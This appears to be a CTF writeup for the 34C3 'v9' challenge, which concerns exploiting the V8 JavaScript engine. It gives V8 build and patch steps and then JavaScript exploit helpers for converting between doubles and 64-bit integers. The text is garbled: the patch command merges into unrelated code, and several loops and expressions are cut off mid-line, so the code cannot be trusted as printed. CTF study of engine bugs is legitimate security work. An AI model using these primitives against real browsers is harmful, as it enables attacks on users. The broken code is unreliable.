# 34c3 v9 writeup
## 环境搭建
    mkdir v9 && cd v9
    fetch v8 && cd v8           # see https://github.com/v8/v8/wiki/Building-from-Source
    git checkout 6.3.292.48
    gclient sync
    patch -p1  8)
                parts.splice(8, 0, ' ');
            lines.push(parts.join(' '));
        }
        return lines.join('\n');
    }
    // Simplified version of the similarly named python module.
    var Struct = (function() {
        // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
        var buffer      = new ArrayBuffer(8);
        var byteView    = new Uint8Array(buffer);
        var uint32View  = new Uint32Array(buffer);
        var float64View = new Float64Array(buffer);
        return {
            pack: function(type, value) {
                var view = type;        // See below
                view[0] = value;
                return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
            },
            unpack: function(type, bytes) {
                if (bytes.length !== type.BYTES_PER_ELEMENT)
                    throw Error("Invalid bytearray");
                var view = type;        // See below
                byteView.set(bytes);
                return view[0];
            },
            // Available types.
            int8:    byteView,
            int32:   uint32View,
            float64: float64View
        };
    })();
    function Int64(v) {
        // The underlying byte array.
        var bytes = new Uint8Array(8);
        switch (typeof v) {
            case 'number':
                v = '0x' + Math.floor(v).toString(16);
            case 'string':
                if (v.startsWith('0x'))
                    v = v.substr(2);
                if (v.length % 2 == 1)
                    v = '0' + v;
                var bigEndian = unhexlify(v, 8);
                //print(bigEndian.toString());
                bytes.set(Array.from(bigEndian).reverse());
                break;
            case 'object':
                if (v instanceof Int64) {
                    bytes.set(v.bytes());
                } else {
                    if (v.length != 8)
                        throw TypeError("Array must have excactly 8 elements.");
                    bytes.set(v);
                }
                break;
            case 'undefined':
                break;
            default:
                throw TypeError("Int64 constructor requires an argument.");
        }
        // Return a double whith the same underlying bit representation.
        this.asDouble = function() {
            // Check for NaN
            if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
                throw new RangeError("Integer can not be represented by a double");
            return Struct.unpack(Struct.float64, bytes);
        };
        // Return a javascript value with the same underlying bit representation.
        // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
        // due to double conversion constraints.
        this.asJSValue = function() {
            if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
                throw new RangeError("Integer can not be represented by a JSValue");
            // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
            this.assignSub(this, 0x1000000000000);
            var res = Struct.unpack(Struct.float64, bytes);
            this.assignAdd(this, 0x1000000000000);
            return res;
        };
        // Return the underlying bytes of this number as array.
        this.bytes = function() {
            return Array.from(bytes);
        };
        // Return the byte at the given index.
        this.byteAt = function(i) {
            return bytes[i];
        };
        // Return the value of this number as unsigned hex string.
        this.toString = function() {
            //print("toString");
            return '0x' + hexlify(Array.from(bytes).reverse());
        };
        // Basic arithmetic.
        // These functions assign the result of the computation to their 'this' object.
        // Decorator for Int64 instance operations. Takes care
        // of converting arguments to Int64 instances if required.
        function operation(f, nargs) {
            return function() {
                if (arguments.length != nargs)
                    throw Error("Not enough arguments for function " + f.name);
                for (var i = 0; i  0xff | 0;
                bytes[i] = cur;
            }
            return this;
        }, 2);
        // this = a - b
        this.assignSub = operation(function sub(a, b) {
            var carry = 0;
            for (var i = 0; i >> 0;
        //b = b >>> 0;
        //print(a.toString());
        //print(b.toString());
        return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);
    }
    //padLeft用于字符串左补位
    function combineint(a, b) {
        //a = a >>> 0;
        //b = b >>> 0;
        return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);
    }
      // based on Long.js by dcodeIO
      // https://github.com/dcodeIO/Long.js
      // License Apache 2
      class _u64 {
         constructor(hi, lo) {
            this.lo_ = lo;
            this.hi_ = hi;
         }
         hex() {
            var hlo = (this.lo_ >> 16;
            var a32 = this.hi_ & 0xFFFF;
            var a16 = this.lo_ >>> 16;
            var a00 = this.lo_ & 0xFFFF;
            var b48 = val.hi_ >>> 16;
            var b32 = val.hi_ & 0xFFFF;
            var b16 = val.lo_ >>> 16;
            var b00 = val.lo_ & 0xFFFF;
            var c48 = 0, c32 = 0, c16 = 0, c00 = 0;
            c00 += a00 + b00;
            c16 += c00 >>> 16;
            c00 &= 0xFFFF;
            c16 += a16 + b16;